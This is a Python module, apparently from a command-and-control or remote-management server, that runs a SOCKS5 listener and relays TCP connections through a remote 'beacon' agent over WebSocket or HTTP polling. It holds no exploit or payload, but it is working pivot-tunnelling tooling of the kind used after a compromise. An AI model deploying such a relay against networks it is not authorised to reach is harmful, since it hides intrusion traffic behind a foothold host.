"""
SOCKS5 listener on the operator host; TCP is relayed through the beacon.

Agent transport (main /cmd beacon unchanged):
  - WebSocket GET /socks?... with Upgrade (push tasks, low latency) when supported
  - HTTP GET/POST /socks (poll fallback)
"""

from __future__ import annotations

import base64
import json
import socket
import struct
import threading
import uuid
from collections import deque
from typing import Any

DEFAULT_SOCKS_PORT = 1080
DEFAULT_BIND_HOST = "127.0.0.1"
SOCKS_CHUNK = 16384
CONNECT_TIMEOUT = 45.0
RELAY_IDLE_TIMEOUT = 300.0


def _b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def _ub64(text: str) -> bytes:
    return base64.b64decode(text)


class SessionSocksBridge:
    """Per-session SOCKS relay state (server-side listener + beacon task queue)."""

    def __init__(self, session_id: str, bind_host: str, port: int, on_log=None):
        self.session_id = session_id
        self.bind_host = bind_host
        self.port = port
        self.on_log = on_log or (lambda _msg, _level="INFO": None)
        self.lock = threading.Lock()
        self.task_queue: deque[dict[str, Any]] = deque()
        self.connect_events: dict[str, threading.Event] = {}
        self.connect_errors: dict[str, str] = {}
        self.tunnels: dict[str, dict[str, Any]] = {}
        self._pending_sends: dict[str, deque[dict[str, Any]]] = {}
        self._listener_sock: socket.socket | None = None
        self._accept_thread: threading.Thread | None = None
        self._running = False
        self._agent_ws: Any = None
        self._agent_ws_lock = threading.Lock()

    def log(self, msg: str, level: str = "INFO"):
        self.on_log(msg, level)

    def start(self) -> None:
        with self.lock:
            if self._running:
                return
            self._running = True
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.bind_host, self.port))
        sock.listen(64)
        sock.settimeout(1.0)
        self._listener_sock = sock
        self._accept_thread = threading.Thread(
            target=self._accept_loop, name=f"socks-{self.session_id[:8]}", daemon=True
        )
        self._accept_thread.start()
        self.log(
            f"SOCKS5 listening on {self.bind_host}:{self.port} (session {self.session_id[:8]})",
            "SUCCESS",
        )

    def agent_ws_connected(self) -> bool:
        with self._agent_ws_lock:
            ws = self._agent_ws
        return ws is not None and not ws.closed

    def attach_agent_ws(self, ws: Any) -> None:
        """Register agent WebSocket; push queued tasks and stream new tasks over WS."""
        with self._agent_ws_lock:
            old = self._agent_ws
            self._agent_ws = ws
        if old and old is not ws:
            try:
                old.close()
            except Exception:
                pass
        try:
            ws.send_json({"op": "active", "active": True})
        except Exception:
            self.detach_agent_ws(ws)

    def detach_agent_ws(self, ws: Any) -> None:
        with self._agent_ws_lock:
            if self._agent_ws is ws:
                self._agent_ws = None

    def _push_tasks_ws(self, tasks: list[dict[str, Any]]) -> bool:
        if not tasks:
            return True
        with self._agent_ws_lock:
            ws = self._agent_ws
        if not ws or ws.closed:
            return False
        try:
            ws.send_json({"op": "tasks", "tasks": tasks})
            return True
        except Exception:
            self.detach_agent_ws(ws)
            return False

    def stop(self) -> None:
        with self.lock:
            self._running = False
            tunnels = list(self.tunnels.values())
            self.tunnels.clear()
            self.task_queue.clear()
            for ev in self.connect_events.values():
                ev.set()
            self.connect_events.clear()
            self.connect_errors.clear()
            self._pending_sends.clear()
        with self._agent_ws_lock:
            aws = self._agent_ws
            self._agent_ws = None
        if aws:
            try:
                aws.send_json({"op": "active", "active": False})
            except Exception:
                pass
            try:
                aws.close()
            except Exception:
                pass
        for t in tunnels:
            self._close_tunnel(t, notify_client=False)
        ls = self._listener_sock
        self._listener_sock = None
        if ls:
            try:
                ls.close()
            except OSError:
                pass
        if self._accept_thread and self._accept_thread.is_alive():
            self._accept_thread.join(timeout=2.0)
        self.log(f"SOCKS stopped for session {self.session_id[:8]}", "INFO")

    def _accept_loop(self) -> None:
        while True:
            with self.lock:
                if not self._running:
                    break
                ls = self._listener_sock
            if not ls:
                break
            try:
                client_sock, _addr = ls.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(
                target=self._handle_socks_client,
                args=(client_sock,),
                daemon=True,
            ).start()

    def _enqueue_task(self, task: dict[str, Any]) -> None:
        with self.lock:
            if task.get("op") == "send":
                cid = task.get("id")
                tunnel = self.tunnels.get(cid) if cid else None
                if cid and (not tunnel or not tunnel.get("client")):
                    if cid not in self._pending_sends:
                        self._pending_sends[cid] = deque()
                    self._pending_sends[cid].append(task)
                    return
            self.task_queue.append(task)

    def _drain_task_queue(self) -> list[dict[str, Any]]:
        """Dequeue deliverable tasks (send once; connect until ack)."""
        with self.lock:
            outbound: list[dict[str, Any]] = []
            keep: deque[dict[str, Any]] = deque()
            for task in self.task_queue:
                if task.get("op") == "send":
                    outbound.append(task)
                else:
                    keep.append(task)
            self.task_queue = keep
            return outbound + list(keep)

    def fetch_tasks_for_pull(self) -> list[dict[str, Any]]:
        """Tasks for agent pull (WebSocket handler thread only)."""
        return self._drain_task_queue()

    def _drop_tasks(self, conn_id: str, op: str) -> None:
        with self.lock:
            self.task_queue = deque(
                t for t in self.task_queue
                if not (t.get("id") == conn_id and t.get("op") == op)
            )

    def _flush_pending_sends(self, conn_id: str) -> None:
        with self.lock:
            pending = self._pending_sends.pop(conn_id, None)
        if pending:
            for task in pending:
                self._enqueue_task(task)

    def fetch_tasks(self) -> list[dict[str, Any]]:
        """HTTP poll only; WebSocket agents use pull on the WS thread."""
        with self._agent_ws_lock:
            ws = self._agent_ws
            if ws is not None and not ws.closed:
                return []
        return self._drain_task_queue()

    def submit_responses(self, responses: list[dict[str, Any]]) -> None:
        for resp in responses:
            if not isinstance(resp, dict):
                continue
            op = resp.get("op")
            cid = resp.get("id")
            if not cid:
                continue
            if op == "ok":
                self._drop_tasks(cid, "connect")
                with self.lock:
                    if cid not in self.tunnels:
                        self.tunnels[cid] = {"id": cid}
                    ev = self.connect_events.get(cid)
                if ev:
                    ev.set()
                self._flush_pending_sends(cid)
                self.log(f"SOCKS remote connect ok {cid[:8]}", "INFO")
            elif op == "error":
                self._drop_tasks(cid, "connect")
                msg = str(resp.get("msg") or "connect failed")
                with self.lock:
                    self.connect_errors[cid] = msg
                    ev = self.connect_events.get(cid)
                if ev:
                    ev.set()
                self.log(f"SOCKS remote connect failed {cid[:8]}: {msg}", "WARNING")
            elif op == "data":
                data_b64 = resp.get("data_b64")
                if not data_b64:
                    continue
                try:
                    payload = _ub64(data_b64)
                except Exception:
                    continue
                with self.lock:
                    tunnel = self.tunnels.get(cid)
                if tunnel and payload:
                    sock = tunnel.get("client")
                    if not sock:
                        continue
                    try:
                        sock.sendall(payload)
                    except OSError:
                        self._close_tunnel(tunnel)
            elif op in ("closed", "close"):
                self._drop_tasks(cid, "connect")
                self._drop_tasks(cid, "send")
                with self.lock:
                    self._pending_sends.pop(cid, None)
                    tunnel = self.tunnels.pop(cid, None)
                if tunnel:
                    self._close_tunnel(tunnel, notify_client=False)

    def _close_tunnel(self, tunnel: dict[str, Any], *, notify_client: bool = True) -> None:
        sock = tunnel.get("client")
        if sock:
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass
        if notify_client:
            cid = tunnel.get("id")
            if cid:
                self._enqueue_task({"op": "close", "id": cid})

    def _wait_connect(self, conn_id: str) -> bool:
        ev = threading.Event()
        with self.lock:
            self.connect_events[conn_id] = ev
        ok = ev.wait(timeout=CONNECT_TIMEOUT)
        with self.lock:
            self.connect_events.pop(conn_id, None)
            err = self.connect_errors.pop(conn_id, None)
        if err:
            self.log(f"SOCKS tunnel {conn_id[:8]} failed: {err}", "WARNING")
            return False
        return ok

    def _handle_socks_client(self, client_sock: socket.socket) -> None:
        try:
            client_sock.settimeout(30.0)
            if not self._socks5_handshake(client_sock):
                return
            target_host, target_port = self._socks5_read_request(client_sock)
            if not target_host:
                return
            conn_id = uuid.uuid4().hex
            self.log(f"SOCKS connect request -> {target_host}:{target_port} ({conn_id[:8]})", "INFO")
            self._enqueue_task(
                {"op": "connect", "id": conn_id, "host": target_host, "port": target_port}
            )
            if not self._wait_connect(conn_id):
                self._socks5_reply(client_sock, rep=0x05)  # connection refused
                return
            with self.lock:
                tunnel = self.tunnels.get(conn_id)
            if not tunnel:
                self._socks5_reply(client_sock, rep=0x05)
                return
            if not self._socks5_reply(client_sock, rep=0x00):
                self._close_tunnel(tunnel)
                return
            tunnel["client"] = client_sock
            self._relay_local_to_remote(tunnel)
        except Exception as exc:
            self.log(f"SOCKS client error: {exc}", "ERROR")
        finally:
            try:
                client_sock.close()
            except OSError:
                pass

    def _relay_local_to_remote(self, tunnel: dict[str, Any]) -> None:
        client_sock = tunnel["client"]
        conn_id = tunnel["id"]
        client_sock.settimeout(1.0)
        try:
            while True:
                with self.lock:
                    if not self._running or conn_id not in self.tunnels:
                        break
                try:
                    data = client_sock.recv(SOCKS_CHUNK)
                except socket.timeout:
                    continue
                if not data:
                    break
                self._enqueue_task(
                    {"op": "send", "id": conn_id, "data_b64": _b64(data)}
                )
        except OSError:
            pass
        finally:
            with self.lock:
                tunnel = self.tunnels.pop(conn_id, None)
            if tunnel:
                self._close_tunnel(tunnel)

    @staticmethod
    def _socks5_handshake(client_sock: socket.socket) -> bool:
        header = client_sock.recv(2)
        if len(header) < 2 or header[0] != 0x05:
            return False
        nmethods = header[1]
        methods = client_sock.recv(nmethods)
        if len(methods) < nmethods:
            return False
        client_sock.sendall(b"\x05\x00")
        return True

    @staticmethod
    def _socks5_read_request(client_sock: socket.socket) -> tuple[str | None, int | None]:
        req = client_sock.recv(4)
        if len(req) < 4 or req[0] != 0x05 or req[1] != 0x01:
            return None, None
        atyp = req[3]
        if atyp == 0x01:
            raw = client_sock.recv(4)
            if len(raw) < 4:
                return None, None
            host = socket.inet_ntoa(raw)
        elif atyp == 0x03:
            n = client_sock.recv(1)
            if not n:
                return None, None
            host_len = n[0]
            host_b = client_sock.recv(host_len)
            if len(host_b) < host_len:
                return None, None
            host = host_b.decode("utf-8", errors="replace")
        elif atyp == 0x04:
            raw = client_sock.recv(16)
            if len(raw) < 16:
                return None, None
            host = socket.inet_ntop(socket.AF_INET6, raw)
        else:
            return None, None
        port_b = client_sock.recv(2)
        if len(port_b) < 2:
            return None, None
        port = struct.unpack("!H", port_b)[0]
        return host, port

    @staticmethod
    def _socks5_reply(client_sock: socket.socket, rep: int) -> bool:
        # VER REP RSV ATYP BND.ADDR BND.PORT — bound address unused (0.0.0.0:0)
        reply = struct.pack("!BBBB", 0x05, rep, 0x00, 0x01) + socket.inet_aton("0.0.0.0") + struct.pack("!H", 0)
        client_sock.sendall(reply)
        return rep == 0x00

class SocksManager:
    """Registry of per-session SOCKS bridges on the RMM server."""

    def __init__(self, log_fn=None):
        self.lock = threading.Lock()
        self.bridges: dict[str, SessionSocksBridge] = {}
        self.log_fn = log_fn

    def _log(self, msg: str, level: str = "INFO"):
        if self.log_fn:
            self.log_fn(msg, level)

    def get(self, session_id: str) -> SessionSocksBridge | None:
        with self.lock:
            return self.bridges.get(session_id)

    def start(self, session_id: str, port: int = DEFAULT_SOCKS_PORT, bind_host: str = DEFAULT_BIND_HOST) -> SessionSocksBridge:
        with self.lock:
            existing = self.bridges.get(session_id)
            if existing:
                existing.stop()
            bridge = SessionSocksBridge(
                session_id,
                bind_host,
                port,
                on_log=lambda m, lvl="INFO": self._log(m, lvl),
            )
            self.bridges[session_id] = bridge
        bridge.start()
        return bridge

    def stop(self, session_id: str) -> bool:
        with self.lock:
            bridge = self.bridges.pop(session_id, None)
        if bridge:
            bridge.stop()
            return True
        return False

    def stop_all(self) -> None:
        with self.lock:
            ids = list(self.bridges.keys())
        for sid in ids:
            self.stop(sid)

    def poll_tasks(self, session_id: str) -> list[dict[str, Any]]:
        bridge = self.get(session_id)
        if not bridge:
            return []
        return bridge.fetch_tasks()

    def post_responses(self, session_id: str, body: str) -> bool:
        bridge = self.get(session_id)
        if not bridge:
            return True
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            return False
        responses = data.get("responses")
        if not isinstance(responses, list):
            return False
        bridge.submit_responses(responses)
        return True

    def attach_agent_ws(self, session_id: str, ws: Any) -> bool:
        bridge = self.get(session_id)
        if not bridge:
            return False
        bridge.attach_agent_ws(ws)
        return True

    def detach_agent_ws(self, session_id: str, ws: Any) -> None:
        bridge = self.get(session_id)
        if bridge:
            bridge.detach_agent_ws(ws)

    def submit_agent_responses(self, session_id: str, responses: list) -> bool:
        bridge = self.get(session_id)
        if not bridge:
            return True
        if not isinstance(responses, list):
            return False
        bridge.submit_responses(responses)
        return True

    def pull_tasks_for_ws(self, session_id: str) -> list[dict[str, Any]]:
        bridge = self.get(session_id)
        if not bridge:
            return []
        return bridge.fetch_tasks_for_pull()
